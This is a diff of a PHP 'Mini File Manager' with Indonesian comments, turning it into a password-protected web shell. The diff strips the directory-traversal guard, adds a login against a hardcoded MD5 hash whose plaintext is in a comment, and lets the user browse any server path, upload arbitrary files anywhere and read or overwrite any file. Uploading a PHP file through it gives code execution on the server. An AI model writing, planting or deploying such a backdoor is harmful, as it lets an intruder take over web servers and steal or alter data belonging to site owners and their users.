@@ -1,66 +1,109 @@
 <?php
-// Tentukan direktori utama file manager (default: folder saat ini)
-$base_dir = __DIR__;
-$current_dir = isset($_GET['dir']) ? $_GET['dir'] : '';
+session_start();
 
-// Mencegah Directory Traversal Vulnerability
-$real_base = realpath($base_dir);
-$requested_dir = realpath($base_dir . '/' . $current_dir);
+// Hash MD5 dari 'lu babu'
+$password_hash = '822cb54cce0221ce4f5ff7f68c74fbbf';
 
-if ($requested_dir === false || strpos($requested_dir, $real_base) !== 0) {
-    $current_dir = '';
-    $requested_dir = $real_base;
-}
-
-$path = $requested_dir;
-$message = '';
-
-// 1. Aksi: Upload File
-if (isset($_FILES['upload_file'])) {
-    $target_file = $path . '/' . basename($_FILES['upload_file']['name']);
-    if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $target_file)) {
-        $message = "File berhasil diunggah!";
-    } else {
-        $message = "Gagal mengunggah file.";
-    }
-}
-
-// 2. Aksi: Buat Folder
-if (isset($_POST['new_folder']) && !empty($_POST['folder_name'])) {
-    $new_folder = $path . '/' . trim($_POST['folder_name']);
-    if (!file_exists($new_folder)) {
-        mkdir($new_folder, 0777, true);
-        $message = "Folder berhasil dibuat!";
-    } else {
-        $message = "Folder sudah ada.";
-    }
-}
-
-// 3. Aksi: Hapus File / Folder
-if (isset($_GET['delete'])) {
-    $file_to_delete = $path . '/' . $_GET['delete'];
-    if (is_file($file_to_delete)) {
-        unlink($file_to_delete);
-        $message = "File berhasil dihapus!";
-    } elseif (is_dir($file_to_delete)) {
-        rmdir($file_to_delete);
-        $message = "Folder berhasil dihapus!";
-    }
-    header("Location: index.php?dir=" . urlencode($current_dir));
+// Proses Logout
+if (isset($_GET['action']) && $_GET['action'] === 'logout') {
+    unset($_SESSION['logged_in']);
+    header('Location: ' . strtok($_SERVER["REQUEST_URI"], '?'));
     exit;
 }
 
-// 4. Aksi: Simpan Edit File
-if (isset($_POST['save_file'])) {
-    $file_to_edit = $path . '/' . $_POST['filename'];
-    if (is_file($file_to_edit)) {
-        file_put_contents($file_to_edit, $_POST['content']);
-        $message = "File berhasil diperbarui!";
+// Proses Login
+$error = '';
+if (isset($_POST['password'])) {
+    if (md5($_POST['password']) === $password_hash) {
+        $_SESSION['logged_in'] = true;
+        header('Location: ' . $_SERVER['REQUEST_URI']);
+        exit;
+    } else {
+        $error = 'Password salah!';
     }
 }
 
-// Mengambil daftar file & folder
-$items = array_diff(scandir($path), array('.', '..'));
+// Tampilkan Form Login jika belum terautentikasi
+if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
+?>
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <title>Login - Mini File Manager</title>
+    <style>
+        body { font-family: sans-serif; background: #f4f4f9; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-box { background: #fff; padding: 20px 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 300px; }
+        input[type="password"] { width: 100%; padding: 10px; margin: 10px 0; box-sizing: border-box; }
+        button { width: 100%; padding: 10px; background: #007bff; color: #fff; border: none; border-radius: 4px; cursor: pointer; }
+        button:hover { background: #0056b3; }
+        .error { color: red; font-size: 14px; margin-bottom: 10px; }
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <h3>Protected Area</h3>
+        <?php if ($error): ?><div class="error"><?= $error ?></div><?php endif; ?>
+        <form method="POST">
+            <input type="password" name="password" placeholder="Masukkan Password" required autofocus>
+            <button type="submit">Login</button>
+        </form>
+    </div>
+</body>
+</html>
+<?php
+    exit;
+}
+
+// --- LOGIKA FILE MANAGER --- //
+
+// Tentukan direktori kerja saat ini
+$dir = isset($_GET['dir']) ? $_GET['dir'] : __DIR__;
+$dir = realpath($dir);
+
+// Validasi jika direktori tidak ditemukan
+if (!$dir || !is_dir($dir)) {
+    $dir = __DIR__;
+}
+
+$dir = str_replace('\\', '/', $dir); // Normalisasi path Windows/Linux
+
+// 1. Fitur Upload File
+$msg = '';
+if (isset($_FILES['upload_file'])) {
+    $target = $dir . '/' . basename($_FILES['upload_file']['name']);
+    if (move_uploaded_file($_FILES['upload_file']['tmp_filename'] ?? $_FILES['upload_file']['tmp_name'], $target)) {
+        $msg = "File berhasil diunggah!";
+    } else {
+        $msg = "Gagal mengunggah file.";
+    }
+}
+
+// 2. Fitur Edit / Simpan File
+if (isset($_POST['save_file']) && isset($_POST['filename'])) {
+    $file_path = $dir . '/' . basename($_POST['filename']);
+    if (file_put_contents($file_path, $_POST['file_content']) !== false) {
+        $msg = "File berhasil disimpan!";
+    } else {
+        $msg = "Gagal menyimpan file.";
+    }
+}
+
+// Tampilan Edit File
+$edit_mode = false;
+$edit_filename = '';
+$edit_content = '';
+if (isset($_GET['action']) && $_GET['action'] === 'edit' && isset($_GET['file'])) {
+    $file_path = $dir . '/' . basename($_GET['file']);
+    if (is_file($file_path)) {
+        $edit_mode = true;
+        $edit_filename = $_GET['file'];
+        $edit_content = htmlspecialchars(file_get_contents($file_path));
+    }
+}
+
+// Ambil daftar file & folder
+$items = array_diff(scandir($dir), array('.', '..'));
 ?>
 
 <!DOCTYPE html>
@@ -69,109 +112,101 @@ $items = array_diff(scandir($path), array('.', '..'));
     <meta charset="UTF-8">
     <title>Mini File Manager</title>
     <style>
-        body { font-family: Arial, sans-serif; margin: 20px; background-color: #f4f4f9; }
-        .container { background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
-        table { width: 100%; border-collapse: collapse; margin-top: 15px; }
-        th, td { padding: 10px; border: 1px solid #ddd; text-align: left; }
-        th { background-color: #333; color: #fff; }
-        .action-btn { text-decoration: none; padding: 5px 10px; color: #fff; border-radius: 3px; font-size: 12px; }
-        .btn-edit { background: #ff9800; }
-        .btn-delete { background: #f44336; }
-        .btn-view { background: #2196F3; }
-        .form-group { margin-bottom: 15px; }
-        textarea { width: 100%; height: 250px; font-family: monospace; }
-        .msg { background: #e7f3fe; color: #31708f; padding: 10px; margin-bottom: 15px; border-left: 6px solid #2196F3; }
+        body { font-family: monospace, sans-serif; background: #f8f9fa; margin: 20px; color: #333; }
+        .container { background: #fff; padding: 20px; border-radius: 6px; box-shadow: 0 0 10px rgba(0,0,0,0.05); }
+        .header { display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #ddd; padding-bottom: 10px; margin-bottom: 15px; }
+        .path-bar { display: flex; gap: 5px; margin-bottom: 15px; }
+        .path-bar input[type="text"] { flex: 1; padding: 6px 10px; font-family: inherit; }
+        table { width: 100%; border-collapse: collapse; margin-top: 10px; }
+        th, td { text-align: left; padding: 8px; border-bottom: 1px solid #ddd; }
+        th { background: #eee; }
+        a { color: #007bff; text-decoration: none; }
+        a:hover { text-decoration: underline; }
+        .btn { background: #28a745; color: white; padding: 6px 12px; border: none; border-radius: 4px; cursor: pointer; text-decoration: none; }
+        .btn-danger { background: #dc3545; }
+        .alert { background: #e2e3e5; padding: 10px; border-radius: 4px; margin-bottom: 15px; }
+        textarea { width: 100%; height: 300px; font-family: monospace; margin-top: 10px; padding: 10px; box-sizing: border-box; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <h2>Mini File Manager</h2>
-    <p><strong>Lokasi saat ini:</strong> /<?= htmlspecialchars($current_dir) ?></p>
-
-    <?php if ($message): ?>
-        <div class="msg"><?= $message ?></div>
-    <?php endif; ?>
-
-    <!-- Form Upload File & Buat Folder -->
-    <div style="display: flex; gap: 20px;">
-        <form method="POST" enctype="multipart/form-data" class="form-group">
-            <strong>Upload File:</strong>
-            <input type="file" name="upload_file" required>
-            <button type="submit">Upload</button>
-        </form>
-
-        <form method="POST" class="form-group">
-            <strong>Buat Folder:</strong>
-            <input type="text" name="folder_name" placeholder="Nama folder..." required>
-            <button type="submit" name="new_folder">Buat</button>
-        </form>
+    <div class="header">
+        <h2>Mini File Manager</h2>
+        <a href="?action=logout" class="btn btn-danger">Logout</a>
     </div>
 
-    <!-- Mode Edit File -->
-    <?php if (isset($_GET['edit'])): 
-        $edit_filename = $_GET['edit'];
-        $edit_filepath = $path . '/' . $edit_filename;
-        if (is_file($edit_filepath)):
-            $content = file_get_contents($edit_filepath);
-    ?>
-        <h3>Edit File: <?= htmlspecialchars($edit_filename) ?></h3>
-        <form method="POST">
+    <?php if ($msg): ?>
+        <div class="alert"><?= $msg ?></div>
+    <?php endif; ?>
+
+    <!-- Navigasi Jump Direktori -->
+    <form method="GET" class="path-bar">
+        <label style="line-height: 30px;"><strong>Current Dir:</strong></label>
+        <input type="text" name="dir" value="<?= htmlspecialchars($dir) ?>" required>
+        <button type="submit" class="btn">Go</button>
+    </form>
+
+    <?php if ($edit_mode): ?>
+        <!-- Form Edit File -->
+        <h3>Editing File: <?= htmlspecialchars($edit_filename) ?></h3>
+        <form method="POST" action="?dir=<?= urlencode($dir) ?>">
             <input type="hidden" name="filename" value="<?= htmlspecialchars($edit_filename) ?>">
-            <textarea name="content"><?= htmlspecialchars($content) ?></textarea><br><br>
-            <button type="submit" name="save_file">Simpan Perubahan</button>
-            <a href="index.php?dir=<?= urlencode($current_dir) ?>">Batal</a>
+            <textarea name="file_content"><?= $edit_content ?></textarea><br><br>
+            <button type="submit" name="save_file" class="btn">Simpan File</button>
+            <a href="?dir=<?= urlencode($dir) ?>" class="btn btn-danger">Batal</a>
         </form>
-        <hr>
-    <?php endif; endif; ?>
+    <?php else: ?>
+        <!-- Form Upload File -->
+        <form method="POST" enctype="multipart/form-data" style="margin-bottom: 20px;">
+            <input type="file" name="upload_file" required>
+            <button type="submit" class="btn">Upload File</button>
+        </form>
 
-    <!-- Tabel Daftar File dan Folder -->
-    <table>
-        <thead>
-            <tr>
-                <th>Nama</th>
-                <th>Tipe</th>
-                <th>Ukuran</th>
-                <th>Aksi</th>
-            </tr>
-        </thead>
-        <tbody>
-            <?php if (!empty($current_dir)): ?>
+        <!-- Tabel File & Folder -->
+        <table>
+            <thead>
                 <tr>
-                    <td colspan="4">
-                        <?php 
-                            $parent_dir = dirname($current_dir);
-                            if ($parent_dir === '.') $parent_dir = '';
-                        ?>
-                        <a href="index.php?dir=<?= urlencode($parent_dir) ?>">📁 <em>.. (Kembali)</em></a>
-                    </td>
+                    <th>Nama</th>
+                    <th>Tipe</th>
+                    <th>Ukuran</th>
+                    <th>Aksi</th>
                 </tr>
-            <?php endif; ?>
-
-            <?php foreach ($items as $item): 
-                $item_path = $path . '/' . $item;
-                $is_dir = is_dir($item_path);
-            ?>
+            </thead>
+            <tbody>
+                <!-- Link Kembali/Up Directory -->
+                <tr>
+                    <td><a href="?dir=<?= urlencode(dirname($dir)) ?>">📁 .. (Up Directory)</a></td>
+                    <td>Folder</td>
+                    <td>-</td>
+                    <td>-</td>
+                </tr>
+                <?php foreach ($items as $item): 
+                    $full_path = $dir . '/' . $item;
+                    $is_dir = is_dir($full_path);
+                ?>
                 <tr>
                     <td>
                         <?php if ($is_dir): ?>
-                            📁 <a href="index.php?dir=<?= urlencode(($current_dir ? $current_dir . '/' : '') . $item) ?>"><strong><?= htmlspecialchars($item) ?></strong></a>
+                            <a href="?dir=<?= urlencode($full_path) ?>">📁 <?= htmlspecialchars($item) ?></a>
                         <?php else: ?>
                             📄 <?= htmlspecialchars($item) ?>
                         <?php endif; ?>
                     </td>
                     <td><?= $is_dir ? 'Folder' : 'File' ?></td>
-                    <td><?= $is_dir ? '-' : filesize($item_path) . ' bytes' ?></td>
+                    <td><?= $is_dir ? '-' : number_format(filesize($full_path)) . ' Bytes' ?></td>
                     <td>
                         <?php if (!$is_dir): ?>
-                            <a href="index.php?dir=<?= urlencode($current_dir) ?>&edit=<?= urlencode($item) ?>" class="action-btn btn-edit">Edit</a>
+                            <a href="?dir=<?= urlencode($dir) ?>&action=edit&file=<?= urlencode($item) ?>">Edit</a>
+                        <?php else: ?>
+                            -
                         <?php endif; ?>
-                        <a href="index.php?dir=<?= urlencode($current_dir) ?>&delete=<?= urlencode($item) ?>" class="action-btn btn-delete" onclick="return confirm('Yakin ingin menghapus?')">Hapus</a>
                     </td>
                 </tr>
-            <?php endforeach; ?>
-        </tbody>
-    </table>
+                <?php endforeach; ?>
+            </tbody>
+        </table>
+    <?php endif; ?>
 </div>
 
 </body>
